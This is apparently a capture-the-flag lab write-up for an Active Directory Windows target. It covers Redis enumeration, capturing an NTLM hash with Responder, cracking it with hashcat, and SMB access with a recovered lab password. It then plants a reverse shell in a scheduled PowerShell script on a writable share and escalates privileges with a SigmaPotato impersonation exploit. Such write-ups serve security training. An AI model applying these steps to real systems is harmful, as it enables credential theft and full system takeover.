### Enumerate Redis port

```bash
redis-cli -h 10.49.167.234
```

when  enter we can run some useful command such as INFO and CONFIG GET *

from the command CONFIG GET *

i found smtg 

![Image1](/assets/images/THM/VulnNetActive/vulnnetActive%20(1).png)

the user and the redis version then we try search for cve 

found this 
https://michalszalkowski.com/pentesting-ports/6379-redis/

### Setup Responder

so first we set up responder then try access the file and we will get the ntlm hash of the enterprise-security

![Image1](/assets/images/THM/VulnNetActive/vulnnetActive%20(2).png)

### Crack the hash

next crack it with hashcat

```cmd
hashcat.exe -m 5600 ..\hash.txt ..\rockyou.txt
```

```cred
domain = vulnnet.local
enterprise-security
sand_0873959498
```

### Enumeration with cred 

```bash
netexec smb 10.49.167.234 -u 'enterprise-security' -p 'sand_0873959498' --shares
```

![Image1](/assets/images/THM/VulnNetActive/vulnnetActive%20(3).png)

found a intersting folder enteprise-share try smb and read it 

we have read and write permission

```bash
smbclient //10.49.167.234/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_0873959498'
```

found a ps file 

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat PurgeIrrelevantData_1826.ps1 
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

### Upload Reverse shell

so we can try to upload reverse shell into it and upload it back since it might be scheduled task run

inside the file PurgeIrrelevantData_1826.ps1

![Image1](/assets/images/THM/VulnNetActive/vulnnetActive%20(4).png)

then upload it back to smb Enterprise-Share folder 

and we will get a shell and can get the user.txt

![Image1](/assets/images/THM/VulnNetActive/vulnnetActive%20(5).png)

### Internal enumeration

now let us check with some simple priv 

```cmd
whoami /priv
```

![Image1](/assets/images/THM/VulnNetActive/vulnnetActive%20(6).png)

something catched my eyes SeImpersonatePrivilege is enbaled  and found thr is PE exploit with it 

but before that let us verify system info 

```
systeminfo
```

![Image1](/assets/images/THM/VulnNetActive/vulnnetActive%20(7).png)

### Exploit  SeImpersonatePrivilege and get system.txt

windows server 2019 we can use printspoofer but my case Sigmapotato work for me 
https://github.com/tylerdotrar/SigmaPotato


copy the system.txt
```
.\SigmaPotato.exe "cmd.exe /c copy C:\Users\Administrator\Desktop\system.txt C:\Users\enterprise-security\Downloads\flag.txt"
```

then read it
